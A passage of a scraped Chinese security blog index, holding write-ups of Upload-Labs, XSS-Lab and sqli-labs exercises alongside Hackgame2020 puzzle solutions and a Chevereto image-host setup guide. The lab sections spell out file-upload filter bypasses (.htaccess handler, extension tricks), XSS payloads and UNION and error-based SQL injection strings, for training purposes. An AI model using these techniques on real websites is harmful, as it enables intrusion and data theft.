$file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = str_ireplace($deny_ext,\u0026#34;\u0026#34;, $file_name); $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t这道题和前面不同的是$file_name = str_ireplace($deny_ext,\u0026quot;\u0026quot;, $file_name)，对于这个函数：str_ireplace(find,replace,string,count)，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名2333.pphphp，只有一个\u0026quot;php\u0026quot;字符串被匹配到并被替换成空串，剩下的文件名就成了2333.php。\n上传并访问文件。完工\n","date":"2020-11-09T20:12:27Z","permalink":"https://www.braindance.top/articles/2020/11/upload-labs%E4%BA%8C/","title":"Upload-Labs(二)"},{"content":"介绍 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。\n在线靶机地址：\nlinux环境 windows环境 Pass-01 ​\t尝试上传php木马，发现提示上传错误\n​\t提示只能上传jpg、png、gif类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。\n​\t源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function checkFile() { var file = document.getElementsByName(\u0026#39;upload_file\u0026#39;)[0].value; if (file == null || file == \u0026#34;\u0026#34;) { alert(\u0026#34;请选择要上传的文件!\u0026#34;); return false; } //定义允许上传的文件类型 var allow_ext = \u0026#34;.jpg|.png|.gif\u0026#34;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\u0026#34;.\u0026#34;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \u0026#34;|\u0026#34;) == -1) { var errMsg = \u0026#34;该文件不允许上传，请上传\u0026#34; + allow_ext + \u0026#34;类型的文件,当前文件类型为：\u0026#34; + ext_name; alert(errMsg); return false; } } ​\t把文件后缀名改成jpg格式上传，使用burp suit抓包。把.jpg后缀重新改为.php即可实现绕过前端JS代码。\n​\t然后右键打开图片，代码成功执行。完工\n​\t注：后面题目的php代码都使用2333.php：\n1 \u0026lt;?php eval(phpinfo()); ​\t执行结果是打印出php版本信息。\nPass-02 ​\t源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/jpeg\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/png\u0026#39;) || ($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;] == \u0026#39;image/gif\u0026#39;)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39; . $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;文件类型不正确，请重新上传！\u0026#39;; } } else { $msg = UPLOAD_PATH.\u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t发现文件判断是根据image/jpeg、image/png...进行过滤判定，这些值都是Http请求中的Content-Type常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:Http请求中Content-Type。\n​\t同样是burp抓包修改Content-Type的值。\n​\t打开图片，php代码成功执行。完工\nPass-03 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#39;.asp\u0026#39;,\u0026#39;.aspx\u0026#39;,\u0026#39;.php\u0026#39;,\u0026#39;.jsp\u0026#39;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t发现只过滤了.asp、.aspx、.php、.jsp文件，那么可以使用php3、phtml、phps、php5文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；而php3，我的理解是php之前版本的文件后缀，如php5。\n​\t直接把2333.php改为2333.php3上传打开，执行成功。完工\nPass-04 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;php1\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;pHp1\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件不允许上传!\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.htaccess文件过滤，所以上传一个.htaccess文件内容如下：\n1 SetHandler application/x-httpd-php ​\t原理的话我讲一下个人的见解：.htaccess文件是一个apache服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为php。参考的博客：htaccess使用方法介绍。\n​\t接下来上传2333.jpg图片木马，再打开就会被成功解析为php文件并执行：\n​\t完工\nPass-05 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $is_upload = false; $msg = null; if (isset($_POST[\u0026#39;submit\u0026#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026#34;.php\u0026#34;,\u0026#34;.php5\u0026#34;,\u0026#34;.php4\u0026#34;,\u0026#34;.php3\u0026#34;,\u0026#34;.php2\u0026#34;,\u0026#34;.html\u0026#34;,\u0026#34;.htm\u0026#34;,\u0026#34;.phtml\u0026#34;,\u0026#34;.pht\u0026#34;,\u0026#34;.pHp\u0026#34;,\u0026#34;.pHp5\u0026#34;,\u0026#34;.pHp4\u0026#34;,\u0026#34;.pHp3\u0026#34;,\u0026#34;.pHp2\u0026#34;,\u0026#34;.Html\u0026#34;,\u0026#34;.Htm\u0026#34;,\u0026#34;.pHtml\u0026#34;,\u0026#34;.jsp\u0026#34;,\u0026#34;.jspa\u0026#34;,\u0026#34;.jspx\u0026#34;,\u0026#34;.jsw\u0026#34;,\u0026#34;.jsv\u0026#34;,\u0026#34;.jspf\u0026#34;,\u0026#34;.jtml\u0026#34;,\u0026#34;.jSp\u0026#34;,\u0026#34;.jSpx\u0026#34;,\u0026#34;.jSpa\u0026#34;,\u0026#34;.jSw\u0026#34;,\u0026#34;.jSv\u0026#34;,\u0026#34;.jSpf\u0026#34;,\u0026#34;.jHtml\u0026#34;,\u0026#34;.asp\u0026#34;,\u0026#34;.aspx\u0026#34;,\u0026#34;.asa\u0026#34;,\u0026#34;.asax\u0026#34;,\u0026#34;.ascx\u0026#34;,\u0026#34;.ashx\u0026#34;,\u0026#34;.asmx\u0026#34;,\u0026#34;.cer\u0026#34;,\u0026#34;.aSp\u0026#34;,\u0026#34;.aSpx\u0026#34;,\u0026#34;.aSa\u0026#34;,\u0026#34;.aSax\u0026#34;,\u0026#34;.aScx\u0026#34;,\u0026#34;.aShx\u0026#34;,\u0026#34;.aSmx\u0026#34;,\u0026#34;.cEr\u0026#34;,\u0026#34;.sWf\u0026#34;,\u0026#34;.swf\u0026#34;,\u0026#34;.htaccess\u0026#34;); $file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, \u0026#39;.\u0026#39;); $file_ext = str_ireplace(\u0026#39;::$DATA\u0026#39;, \u0026#39;\u0026#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.date(\u0026#34;YmdHis\u0026#34;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = \u0026#39;上传出错！\u0026#39;; } } else { $msg = \u0026#39;此文件类型不允许上传！\u0026#39;; } } else { $msg = UPLOAD_PATH . \u0026#39;文件夹不存在,请手工创建！\u0026#39;; } } ​\t细心的话可以发现，这道题的源码中在末尾添加了.htaccess文件过滤，但是也少了一条语句\n1 $file_ext = strtolower($file_ext); //转换为小写 目标就很明确了，直接使用大小写绕过过滤。\n​\t打开图片成功执行。完工\n","date":"2020-11-08T19:23:16Z","permalink":"https://www.braindance.top/articles/2020/11/upload-labs%E4%B8%80/","title":"Upload-Labs(一)"},{"content":"一闪而过的Flag ​\t根据题目信息程序每次运行时隐约可见黑色控制台上有 flag 一闪而过，我想到了应该能看程序的代码啥的找到，但是天下武功，唯快不破，下载 运行 截图一气呵成。\n​\t​\t接下来让我康康哪一位是瞎子，包括答案里也是满满的嘲讽。\n参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}\n从零开始的记账工具人 ​\tnpy给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。\n​\t原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sn = new Scanner(System.in); String str; int x; int cnt=0; double result=0; while(cnt++!=1000){ str = sn.next(); x = sn.nextInt(); result += tonum(str)*x; } System.out.println(result); } public static double tonum(String s){ int len; double res=0,temp = 1; double result=0; len = s.length(); for(int i=0;i\u0026lt;len;i++){ switch (s.charAt(i)){ case \u0026#39;壹\u0026#39;: temp=1;break; case \u0026#39;贰\u0026#39;: temp=2;break; case \u0026#39;叁\u0026#39;: temp=3;break; case \u0026#39;肆\u0026#39;: temp=4;break; case \u0026#39;伍\u0026#39;: temp=5;break; case \u0026#39;陆\u0026#39;: temp=6;break; case \u0026#39;柒\u0026#39;: temp=7;break; case \u0026#39;捌\u0026#39;: temp=8;break; case \u0026#39;玖\u0026#39;: temp=9;break; case \u0026#39;零\u0026#39;: break; case \u0026#39;拾\u0026#39;: res+=temp*10;temp=0;break; case \u0026#39;佰\u0026#39;: res+=temp*100;temp=0;break; case \u0026#39;元\u0026#39;: res+=temp;temp=0;break; case \u0026#39;角\u0026#39;: res+=temp*0.1;temp=0;break; case \u0026#39;分\u0026#39;: res+=temp*0.01;temp=0;break; case \u0026#39;整\u0026#39;: break; default: System.out.println(\u0026#34;这个认不出来\u0026#34; + s.charAt(i)); } } return res; } } ​\t程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用switch判断数字或是个、十、百、千那一位上的数字。\n​\tJava渣轻喷。\n参考答案：flag{19115.33}\n超简单的世界模拟器 ​\t这道题下面有两道小题\n蝴蝶效应 ​\t先看有意思的一个漫画\n​\t一个人用石头模拟了一整个宇宙，斯巴拉西。\n​\t打开题目以后是一个终端，然提示等待你输入一个15*15矩阵（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息生命游戏，百度百科看了一下这个生命游戏，游戏的规则大致就是：一个细胞会根据周围的细胞数量判断存活和死亡，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。\n​\t返回终端里面一片白中间有几个框框，题目中\n如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：\n“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。\n​\t用细胞去碰框框就是了，正好也看到了一个知乎的提问：生命游戏(Game of Life)有哪些图形? - 知乎，看了看内容更有趣了。\n​\t大师我悟了，就是提供一个初始的15*15矩阵，根据生命游戏的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形\n第一关 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 ​\t第一关打上面的黑框，刚好在上面15行的范围内，用一个轻量级飞船直线打过去即可。\n第二关 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 001100000000000 011110000000000 011011000001100 000110000011110 000000000011011 000000000000110 ​\t第二关我期初试了试滑翔者放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个三飞船，正好把两个黑框都给消了。\n参考答案：\n1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}\n2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}\n完工。\n","date":"2020-11-05T09:29:22Z","permalink":"https://www.braindance.top/articles/2020/11/hackgame2020%E4%BA%8C/","title":"Hackgame2020(二)"},{"content":"头 靶机地址：https://buuoj.cn/challenges#XSS-Lab\nlevel 1 ​\t​\t观察发现欢迎用户test与URL中的name=test字段对应，尝试修改发现可行。直接将name字段改为name=\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt;，完工。\nlevel 2 ​\t在搜索栏中的输入会回显到页面，查看网页源代码，发现值在input的value属性中\n​\t构造闭合\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // ，构造以后的标签会变成.... value=\u0026quot;\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // \u0026quot;\u0026gt;。完工\nlevel 3 ​\t老样子构造value属性闭合，尝试\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // 构造闭合，查看网页源代码发现语句变成\u0026amp;quot;\u0026amp;gt; \u0026amp;lt;script\u0026amp;gt;alert()\u0026amp;lt;/script\u0026amp;gt; // ，说明把\u0026quot;、\u0026lt;、\u0026gt;、进行了html编码过滤，尝试构造onmouseover事件(鼠标移到事件)，构造语句'onmouseover='alert()'。完工\nlevel 4 ​\t构造闭合\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // ，查看源代码发现进行了\u0026gt;、\u0026lt;过滤，尝试构造事件\u0026quot; onmouseover='alert()'。完工\n​\t说明一下标签的事件有很多类型，可以自己试试别的事件响应。\nlevel 5 ​\t检查一下都有什么过滤。发现有一下过滤\nscript \u0026ndash;\u0026gt; scr_ipt\nonmouseover \u0026ndash;\u0026gt; o_nmouseover\n无法采用事件，那么尝试构造一个标签 \u0026quot;\u0026gt; \u0026lt;a href='javascript:alert()'\u0026gt;233\u0026lt;/a\u0026gt; //，发现javascript没有过滤，说明判断语句匹配值仅仅为script，点击构造的\u0026lt;a\u0026gt;标签内容。完工\n​\n","date":"2020-11-03T10:13:39Z","permalink":"https://www.braindance.top/articles/2020/11/xss-lab-%E4%B8%80/","title":"XSS-Lab (一)"},{"content":"前言 比赛地址：https://hack.lug.ustc.edu.cn/\nweb 签到题 ​\t第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。\n​\t随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数\n​\t我猜的题目可能是想让数值为1时能提取到flag。\n​\tF12查看源代码，定位到进度条的标签，查看属性\n​\t确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。\n2048 ​\t打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！\nF12开始翻网页资源\n​\t还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。\n​\t打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。\n发现了\n​\t只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。\ngeneral 猫咪问题++ ​\t秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解\n​\t题意思很明显的书考验同学的搜题技巧。那就开工。\n第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.\n提示：学术上一般认为龙不属于哺乳动物。\n​\t本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。\n​\t一个比较有印象就是FreeDOS这个标志就离谱，什么玩意\n参考答案 ：12\n第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​\t卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。\n参考答案：256\n第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？\n​\t搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。\n​\t找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有\n最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。\n​\t答案就是Teeworlds\n​\t我还摸到了他们当天活动的记录资料：点我\n​\t在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣\n参考答案：9\n第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​\t直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。\n参考答案：9\n第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​\t百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀）\n参考答案：17098\n完工。\n","date":"2020-11-01T18:33:40Z","permalink":"https://www.braindance.top/articles/2020/11/hackgame2020%E4%B8%80/","title":"Hackgame2020(一)"},{"content":"前言 在线靶机地址：https://buuoj.cn/challenges#sqli-labs\nless-1 ​\t首先说明sql注入的大致步骤：\n判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​\t根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1'，发现数据库报错\n​\t通过后面的报错语句1'' LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。\n​\t推出数据库的查询的部分语句可能为where id = '$id'LIMIT 0,1，那么通过构造闭合?id=1' [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。\n​\t首先是判断字段个数：?id=1' order by 1 --+，页面显示正常，直到尝试?id=1' order by 4 --+发现数据库报错\n​\t说明数据库的字段值只有四个。\n​\t接下来测试数据的回显位，构造语句?id=' union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。\n​\t执行后页面显示。\n​\t说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如：\n​\t获取数据库版本，数据库路径，当前用户，当前数据库： ​\t?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+\n页面显示\n​\t利用元数据库来爆表、爆数据\n​\t?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+\n​\t之后大家可以自行发挥。\n​\tflag的话我做的题是在ctftraining.flag表中，答案在：?id=' union select 1,flag,3 from ctftraining.flag --+\nless-2 ​\t第二题看题目名称intiger based知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。\nless-3 ​\t看标题Single quotes with twist，是在前面题的基础上加上了括号包裹，所以语句就成了where id = ('id')所以我们闭合的方式也要改变。附源码\nless-4 ​\t标题Double Quotes，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。\nless-5 ​\t标题Double Injection-Single Quotes，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个You are in...........，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。\n​\t双查询注入也是我第一次听，贴一个讲大致原理的帖子：点我。\n​\t构造语句：\n?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+\n​\t讲一下CONCAT_WS(separator,str1,str2,…)函数的用法：把str1、str2连接起来，并使用separator做分隔符。\n","date":"2020-09-22T10:50:08Z","permalink":"https://www.braindance.top/articles/2020/09/sql-labs%E4%B8%80/","title":"sql-labs(一)"},{"content":"博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章越写越多用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到限制，正好发现了Chevereto这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。\nChevereto 说明 Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。\nChevereto分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣\n环境说明 因为Chevereto所需要的环境为\nApache/Nginx\nPHP 5.5+\nMySQL 5.0+\n我太懒了不想动所以我选择使用宝塔面板为我们搭建web环境。\n宝塔面板官网：https://www.bt.cn/\n安装完成以后进入管理面板应该会直接提示你安装需要的环境\n我的环境如下图\n总结安装步骤 去github下载Chevereto的压缩包。 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。 将Chevereto的压缩包上传到网站目录解压。 访问新建的网站就是Chevereto的管理面板，并进行初始配置。 无了。 开始 github下载地址\n创建网站目录和数据库用户\n因为我域名所以域名留空，提示默认使用80端口，访问地址就是服务器ip地址，剩下的自己随机发挥。\n创建完成后需要配置一下网站配置文件才可以访问到配置页面。 在server{...}中添加\n1 2 3 location / { try_files $uri $uri/ /index.php?$query_string; } 配置完成以后应该会自动保存并重启Nginx。\n将在github上下载的Chevereto压缩包上传到刚刚创建的网站目录中（上图是/www/wwwroot）并解压。 之后就可以直接访问服务器ip:80（80端口可以省略），然后一步一步的进行配置。\n可能会出现的错误\nChevereto can’t create the app/settings.php file. You must manually create this file\n解决方法：这个错误就是没有找到setting.php配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在Chevereto的网站目录下的/app目录下执行命令创建文件，并修改文件权限\n1 2 touch settings.php chmod +x settings.php 我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。\n访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。 完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。\n完工 管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习\n然后我的图床地址：http://47.97.231.10/ (已失效) 🈚👇👻来丶se兔\n","date":"2020-09-20T11:09:02Z","permalink":"https://www.braindance.top/articles/2020/09/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/","title":"Chevereto-搭建一个自己的图床"},{"content":"参考文章:Let\u0026rsquo;s Encrypt，免费好用的 HTTPS 证书\n先放官网 Let\u0026rsquo;s Encrypt\nLet\u0026rsquo;s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛\n所需环境 一个 